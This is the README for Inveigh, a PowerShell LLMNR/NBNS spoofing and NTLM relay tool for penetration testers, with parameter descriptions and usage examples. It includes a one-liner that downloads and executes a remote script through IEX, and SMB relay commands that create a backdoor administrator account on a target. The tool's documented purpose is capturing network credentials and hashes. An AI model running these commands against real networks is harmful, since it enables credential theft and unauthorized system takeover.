# Inveigh
Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system. 

## Included In
* PowerShell Empire - https://github.com/PowerShellEmpire/Empire  
* PS>Attack - https://github.com/jaredhaight/psattack  
* p0wnedShell - https://github.com/Cn33liz/p0wnedShell   

## Special Thanks  
* Anyone that posted .NET packet sniffing examples.  
* Responder - https://github.com/SpiderLabs/Responder  
* Impacket - https://github.com/CoreSecurity/impacket  

## Import  
* To import with Import-Module:   
	Import-Module ./Inveigh.psd1  

* To import using the dot source method:  
	. ./Inveigh.ps1  
	. ./Inveigh-BruteForce.ps1  
	. ./Inveigh-Relay.ps1  

* To load into memory using Invoke-Expression:  
	IEX (New-Object Net.WebClient).DownloadString("http://yourhost/Inveigh.ps1")  
	IEX (New-Object Net.WebClient).DownloadString("http://yourhost/Inveigh-Unprivileged.ps1")  
	IEX (New-Object Net.WebClient).DownloadString("http://yourhost/Inveigh-Relay.ps1")  

## System Requirements
* Tested minimums are PowerShell 2.0 and .NET 3.5
	
## Functions  
* Invoke-Inveigh  
* Invoke-InveighUnprivileged  
* Invoke-InveighRelay  
* Clear-Inveigh  
* Get-Inveigh  
* Stop-Inveigh  
* Watch-Inveigh  

### Invoke-Inveigh
* The main Inveigh LLMNR/NBNS spoofer function.

##### Privilege Requirements:
* Elevated Administrator or SYSTEM

##### Features:
* IPv4 LLMNR/NBNS spoofer with granular control     
* NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB  
* Basic auth cleartext credential capture over HTTP/HTTPS  
* WPAD server capable of hosting a basic or custom wpad.dat file  
* HTTP/HTTPS server capable of hosting limited content  
* Granular control of console and file output  
* Run time control  

##### Notes:
* LLMNR/NBNS spoofing is performed by packet sniffing and responding through raw sockets.  
* SMB challenge/response captures are performed by sniffing over the host system's SMB service.  
* The local LLMNR/NBNS services do not need to be disabled on the host system.   
* LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.  
* Ensure that any needed LMMNR, NBNS, SMB, HTTP, HTTPS ports are open within any local firewall on the host system.  
* If you copy/paste challenge/response captures from the console window for password cracking, ensure that there are no extra carriage returns.  

##### Examples:
* To execute with default settings:  
	Invoke-Inveigh

* To load and execute with one line:    
	Import-Module ./Inveigh.ps1;Invoke-Inveigh

* To execute with ConsoleOutput, FileOutput, and the NBNS spoofer enabled.  
	Invoke-Inveigh -ConsoleOutpuy Y -FileOutput Y -NBNS Y  

##### Screenshot:
![inveigh](https://cloud.githubusercontent.com/assets/5897462/18420523/924f9c7a-7842-11e6-984e-153058b28016.png)

##### Parameters:
* __IP__ - Specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if the 'SpooferIP' parameter is not set.  
* __SpooferIP__ - IP address for LLMNR/NBNS spoofing. This parameter is only necessary when redirecting victims to a system other than the Inveigh host.    
* __SpooferHostsReply__ - Default = All: Comma separated list of requested hostnames to respond to when spoofing with LLMNR and NBNS. Listed hostnames will override the whitelist created through SpooferLearning.  
* __SpooferHostsIgnore__ - Default = All: Comma separated list of requested hostnames to ignore when spoofing with LLMNR and NBNS.  
* __SpooferIPsReply__ - Default = All: Comma separated list of source IP addresses to respond to when spoofing with LLMNR and NBNS.  
* __SpooferIPsIgnore__ - Default = All: Comma separated list of source IP addresses to ignore when spoofing with LLMNR and NBNS.  
* __SpooferLearning__ - Default = Disabled: (Y/N) Enable/Disable LLMNR/NBNS valid host learning. If enabled, Inveigh will send out LLMNR/NBNS requests for any received LLMNR/NBNS requests. If a response is received, Inveigh will add the hostname to a spoofing blacklist. The valid system must respond to the protocol type that matches the protocol of the original request in order to be blacklisted.  
* __SpooferLearningDelay__ - (Integer) Time in minutes that Inveigh will delay spoofing while valid hosts are being blacklisted through SpooferLearning.  
* __SpooferLearningInterval__ - Default = 30 Minutes: (Integer) Time in minutes that Inveigh wait before sending out an LLMNR/NBNS request for a hostname that has already been checked if SpooferLearning is enabled.  
* __SpooferRepeat__ - Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured.  
* __LLMNR__ - Default = Enabled: (Y/N) Enable/Disable LLMNR spoofer.  
* __LLMNRTTL__ - Default = 30 Seconds: LLMNR TTL in seconds for the response packet.  
* __NBNS__ - Default = Disabled: (Y/N) Enable/Disable NBNS spoofer.  
* __NBNSTTL__ - Default = 165 Seconds: NBNS TTL in seconds for the response packet.  
* __NBNSTypes__ - Default = 00,20: Comma separated list of NBNS types to spoof. Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name  
* __HTTP__ - Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.  
* __HTTPS__ - Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store and attached to port 443. If the function does not exit gracefully, execute "netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal" in the cert store.  
* __HTTPAuth__ - Default = NTLM: (Anonymous,Basic,NTLM) HTTP/HTTPS server authentication type. This setting does not apply to wpad.dat requests. Note that Microsoft has changed the behavior of WDAP through NBNS in the June 2016patches. A WPAD enabled browser may now trigger NTLM authentication after sending out NBNS requests to random hostnames and connecting to the root of the web server.   
* __HTTPBasicRealm__ - Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.  
* __HTTPDir__ - Full directory path to enable hosting of basic content through the HTTP/HTTPS listener.     
* __HTTPDefaultFile__ - Filename within the HTTPDir to serve as the default HTTP/HTTPS response file. This file will not be used for wpad.dat requests.  
* __HTTPDefaultEXE__ - EXE filename within the HTTPDir to serve as the default HTTP/HTTPS response for EXE requests.  
* __HTTPResponse__ - String or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat requests. This parameter will not be used if HTTPDir is set. Use PowerShell character escapes where necessary.  
* __HTTPSCertAppID__ - Valid application GUID for use with the ceriticate.  
* __HTTPSCertThumbprint__ - Certificate thumbprint for use with a custom certificate. The certificate filename must be located in the current working directory and named Inveigh.pfx.   
* __WPADAuth__ - Default = NTLM: (Anonymous,Basic,NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to Anonymous can prevent browser login prompts.  
* __WPADEmptyFile__ - Default = Enabled: (Y/N) Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests. Enabling this setting can reduce the amount of redundant wpad.dat requests. This parameter is ignored when using WPADIP, WPADPort, or WPADResponse.  
* __WPADIP__ - Proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADPort.  
* __WPADPort__ - Proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADIP.  
* __WPADDirectHosts__ - Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the defined proxy.  
* __WPADResponse__ - wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and WPADPort are set. Use PowerShell character escapes where necessary.   
* __SMB__ - Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still direct targets to the host system's SMB server. Block TCP ports 445/139 or kill the SMB services if you need to prevent login requests from being processed by the Inveigh host.  
* __Challenge__ - Default = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request. This will only be used for non-relay captures.  
* __MachineAccounts__ - Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.   
* __ConsoleOutput__ - Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell.
* __ConsoleStatus__ - Default = Disabled: (Integer) Interval in minutes for displaying all unique captured hashes and credentials. This is useful for displaying full capture lists when running through a shell that does not have access to the support functions.  
* __ConsoleUnique__ - Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname, and username combinations when real time console output is enabled.    
* __FileOutput__ - Default = Disabled: (Y/N) Enable/Disable real time file output.  
* __FileUnique__ - Default = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for only unique IP, domain/hostname, and username combinations when real time file output is enabled.   
* __StatusOutput__ - Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.  
* __OutputStreamOnly__ - Default = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh through a shell that does not return other output streams. Note that you will not see the various yellow warning messages if enabled.  
* __OutputDir__ - Default = Working Directory: Valid path to an output directory for log and capture files. FileOutput must also be enabled.  
* __ShowHelp__ - Default = Enabled: (Y/N) Enable/Disable the help messages at startup.  
* __RunTime__ - Default = Unlimited: (Integer) Run time duration in minutes.  
* __Inspect__ - (Switch) Disable LLMNR, NBNS, HTTP, HTTPS, and SMB in order to only inspect LLMNR/NBNS traffic.  
* __Tool__ - Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's Interactive PowerShell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire 
  
### Invoke-InveighUnprivileged
* Inveigh LLMNR/NBNS spoofer function that does not require local administrator access.  

##### Privilege Requirements:
* Regular User
  
##### Features: 
* IPv4 NBNS spoofer with granular control that can be run with or without disabling the local NBNS service  
* IPv4 LLMNR spoofer with granular control that can be run only with the local LLMNR service disabled  
* Targeted IPv4 NBNS brute force spoofer with granular control  
* NTLMv1/NTLMv2 challenge/response capture over HTTP  
* Basic auth cleartext credential capture over HTTP  
* WPAD server capable of hosting a basic or custom wpad.dat file  
* HTTP server capable of hosting limited content  
* Granular control of console and file output  
* Run time control  

##### Notes:  
* The local NBNS service does not need to be disabled on the host system.   
* Ensure that any needed LMMNR, NBNS, HTTP ports are open within any local firewall on the host system.  
* Migrating/injecting into a process that has already been allowed incoming/outgoing firewall access should also work.  
* If you copy/paste challenge/response captures from the console window for password cracking, ensure that there are no extra carriage returns.
* Microsoft released patches in June 2016 that will likely prevent some of this function's brute force features from working the way they did before June.  

##### Examples:
* To execute with default settings:  
	Invoke-InveighUnprivileged

* To execute with ConsoleOutput and FileOutput enabled and a run time of 30 minutes.  
	Invoke-InveighUnprivileged -ConsoleOutpuy Y -FileOutput Y -RunTime 30

##### Screenshot:
![inveigh-unprivileged](https://cloud.githubusercontent.com/assets/5897462/18420530/a6645a02-7842-11e6-8d2c-bd5ff04813fe.png)

##### Parameters:
* __SpooferIP__ - IP address for LLMNR/NBNS spoofing. This parameter is only necessary when redirecting victims to a system other than the Inveigh Unprivileged host.   
* __SpooferTarget__ - IP address to target for brute force NBNS spoofing.   
* __SpooferHostsReply__ - Default = All: Comma separated list of requested hostnames to respond to when spoofing with LLMNR and NBNS.  
* __SpooferHostsIgnore__ - Default = All: Comma separated list of requested hostnames to ignore when spoofing with LLMNR and NBNS.  
* __SpooferIPsReply__ - Default = All: Comma separated list of source IP addresses to respond to when spoofing with LLMNR and NBNS.  
* __SpooferIPsIgnore__ - Default = All: Comma separated list of source IP addresses to ignore when spoofing with LLMNR and NBNS.  
* __SpooferRepeat__ - Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured.  
* __LLMNR__ - Default = Enabled: (Y/N) Enable/Disable LLMNR spoofer.  
* __LLMNRTTL__ - Default = 30 Seconds: LLMNR TTL in seconds for the response packet.  
* __NBNS__ - Default = Disabled: (Y/N) Enable/Disable NBNS spoofer.  
* __NBNSTTL__ - Default = 165 Seconds: NBNS TTL in seconds for the response packet.  
* __NBNSTypes__ - Default = 00,20: Comma separated list of NBNS types to spoof. Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name  
* __NBNSBruteForce__ - Default = Disabled: (Y/N) Enable/Disable NBNS brute force spoofer.  
* __NBNSBruteForceHost__ - Default = WPAD: Hostname for NBNS brute force spoofer.  
* __NBNSBruteForcePause__ Default = Disabled: (Integer) Time in seconds the NBNS brute force spoofer will stop spoofing after an incoming HTTP request is received.   
* __HTTP__ - Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.  
* __HTTPIP__ - Default = Any: IP address for the HTTP listener.  
* __HTTPPort__ - Default = 80: TCP port for the HTTP listener.  
* __HTTPAuth__ - Default = NTLM: (Anonymous,Basic,NTLM) HTTP/HTTPS server authentication type. This setting does not apply to wpad.dat requests. Note that Microsoft has changed the behavior of WDAP through NBNS in the June 2016patches. A WPAD enabled browser may now trigger NTLM authentication after sending out NBNS requests to random hostnames and connecting to the root of the web server.  
* __HTTPBasicRealm__ - Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth. Use PowerShell character escapes where necessary.  
* __HTTPResponse__ - String or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat requests.  
* __WPADAuth__ - Default = NTLM: (Anonymous,Basic,NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to Anonymous can prevent browser login prompts.  
* __WPADEmptyFile__ - Default = Enabled: (Y/N) Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests. Enabling this setting can reduce the amount of redundant wpad.dat requests. This parameter is ignored when using WPADIP, WPADPort, or WPADResponse.  
* __WPADIP__ - Proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADPort.  
* __WPADPort__ - Proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADIP.  
* __WPADDirectHosts__ - Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the defined proxy.   
* __WPADResponse__ - wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and WPADPort are set. Use PowerShell character escapes where necessary.   
* __Challenge__ - Default = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request. This will only be used for non-relay captures.  
* __MachineAccounts__ - Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.  
* __ConsoleStatus__ - Default = Disabled: (Integer) Interval in minutes for displaying all unique captured hashes and credentials. This is useful for displaying full capture lists when running through a shell that does not have access to the support functions.  
* __ConsoleUnique__ - Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname, and username combinations when real time console output is enabled.    
* __FileOutput__ - Default = Disabled: (Y/N) Enable/Disable real time file output.  
* __FileUnique__ - Default = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for only unique IP, domain/hostname, and username combinations when real time file output is enabled.   
* __StatusOutput__ - Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.  
* __OutputStreamOnly__ - Default = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh Brute Force through a shell that does not return other output streams. Note that you will not see the various yellow warning messages if enabled.  
* __OutputDir__ - Default = Working Directory: Valid path to an output directory for log and capture files. FileOutput must also be enabled.  
* __ShowHelp__ - Default = Enabled: (Y/N) Enable/Disable the help messages at startup. 
* __RunCount__ - Default = Unlimited: (Integer) Number of captures to perform before auto-exiting.  
* __RunTime__ - Default = Unlimited: (Integer) Run time duration in minutes.  
* __Tool__ - Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's Interactive PowerShell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire
  
### Invoke-InveighRelay
* The NTLMv2 HTTP/HTTPS to SMB relay command execution function. This function can be used with or without Invoke-Inveigh.

##### Privilege Requirements:
* Elevated Administrator or SYSTEM

##### Features:
* HTTP/HTTPS to SMB NTLMv2 relay with granular control    
* NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS 
* Granular control of console and file output  

##### Examples:
* To execute with basic options:  
	Invoke-Inveigh -HTTP N  
	Invoke-InveighRelay -SMBRelayTarget 192.168.1.50 -SMBRelayCommand "net user Inveigh Summer2016 /add && net localgroup administrators Inveigh /add"  
	
* To execute with and only perform SMB relay with the 'Administrator' account:  
	Invoke-InveighUnprivileged -HTTP N  
	Invoke-InveighRelay -SMBRelayTarget 192.168.1.50 -SMBRelayCommand "net user Inveigh Summer2016 /add && net localgroup administrators Inveigh /add" -SMBRelayUsernames Administrator  

##### Screenshot:
![inveigh-relay](https://cloud.githubusercontent.com/assets/5897462/18420526/9991a758-7842-11e6-90b2-9d519ff03c28.png)

##### Parameters:
* __HTTP__ - Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.  
* __HTTPS__ - Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store and attached to port 443. If the script does not exit gracefully, execute "netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal" in the cert store.  
* __HTTPSCertAppID__ - Valid application GUID for use with the ceriticate.  
* __HTTPSCertThumbprint__ - Certificate thumbprint for use with a custom certificate. The certificate filename must be located in the current working directory and named Inveigh.pfx.    
* __Challenge__ - Default = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request. Note that during SMB relay attempts, the challenge will be pulled from the SMB relay target.  
* __MachineAccounts__ - Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.  
* __WPADAuth__ - Default = NTLM: (Anonymous,NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to Anonymous can prevent browser login prompts.  
* __SMBRelayTarget__ - IP address of system to target for SMB relay.  
* __SMBRelayCommand__ - Command to execute on SMB relay target. Use PowerShell character escapes where necessary.  
* __SMBRelayUsernames__ - Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and domain\username format.  
* __SMBRelayAutoDisable__ - Default = Enable: (Y/N) Automaticaly disable SMB relay after a successful command execution on target.  
* __SMBRelayNetworkTimeout__ - Default = No Timeout: (Integer) Set the duration in seconds that Inveigh will wait for a reply from the SMB relay target after each packet is sent.  
* __ConsoleOutput__ - Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell.  
* __FileOutput__ - Default = Disabled: (Y/N) Enable/Disable real time file output.  
* __StatusOutput__ - Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.  
* __OutputStreamOnly__ - Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh Relay through a shell that does not return other output streams. Note that you will not see the various yellow warning messages if enabled.  
* __OutputDir__ - Default = Working Directory: Valid path to an output directory for log and capture files. FileOutput must also be enabled.  
* __ShowHelp__ - Default = Enabled: (Y/N) Enable/Disable the help messages at startup.  
* __RunTime__ - Default = Unlimited: (Integer) Run time duration in minutes.  
* __Tool__ - Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's Interactive PowerShell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire   

##### Notes:  
* Ensure that any needed HTTP, HTTPS ports are open within any local firewall on the host system.  
* If you copy/paste challenge/response captures from the console window for password cracking, ensure that there are no extra carriage returns.

### Support Functions
* __Clear-Inveigh__ - Clear Inveigh data from memory  
* __Get-Inveigh__ - Get Inveigh data from memory - Parameters: Console, ClearText, CleartextUnique, Learning, Log, NTLMv1, NTLMv1Unique, NTLMv1Usernames, NTLMv2, NTLMv2Unique, NTLMv2Usernames  
* __Stop-Inveigh__ - Stop all running Inveigh functions  
* __Watch-Inveigh__ - Enable real time console output  

##### Screenshot:
![inveigh-support](https://cloud.githubusercontent.com/assets/5897462/18420531/b1858e2e-7842-11e6-9f03-0e86ee704211.png)
